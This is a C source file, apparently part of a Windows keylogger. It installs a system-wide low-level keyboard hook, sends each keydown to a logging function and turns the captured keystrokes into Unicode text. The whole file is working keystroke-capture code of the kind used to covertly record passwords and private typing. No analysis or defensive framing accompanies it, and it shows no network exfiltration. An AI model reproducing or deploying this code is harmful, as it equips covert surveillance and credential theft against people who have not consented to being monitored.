#include "constants.h"
#include "keyboard.h"
#include "keylogger.h"
#include <stddef.h>

// The hook variable shared between the setter and the callback.
HHOOK hook;

// The callback that is fired every time a new keyboard input event is about to be
// posted into a thread input queue.
LRESULT WINAPI hook_callback(int code, WPARAM wparam, LPARAM lparam) {
	// If an action occurred and the keydown event was fired, log the respective 
	// characters of the KBD hook.
	if (code == HC_ACTION && wparam == WM_KEYDOWN)
		log_kbd((KBDLLHOOKSTRUCT*)lparam);

	return CallNextHookEx(hook, code, wparam, lparam);
}

// Sets the low level keyboard hook.
BOOL set_keyboard_hook() {
	hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0);

	return hook != NULL;
}

// Copies the status of the 256 virtual keys to the provided buffer.
void get_keyboard_state(BYTE* buff, size_t size) {
	for (size_t i = 0; i < size; i++) {
		const auto key_state = GetKeyState(i);

		// Right shifts the high order bit by 8 to avoid a narrowing conversion
		// from a SHORT to a BYTE.
		buff[i] = (key_state >> 8) | (key_state & 1);
	}
}

// Right shifts the high order bit by 15 to obtain the virtual key's up/down status.
BOOL is_key_down(DWORD vk_code) {
	return GetKeyState(vk_code) >> 15;
}

// Convert a kbd hook to the respective unicode characters.
int kbd_to_unicode(const KBDLLHOOKSTRUCT* kbd_hook, LPWSTR buff, size_t size) {
	BYTE keyboard_state[KEYBOARD_STATE_SIZE];
	get_keyboard_state(keyboard_state, KEYBOARD_STATE_SIZE);

	return ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, keyboard_state,
		buff, size, 0);
}
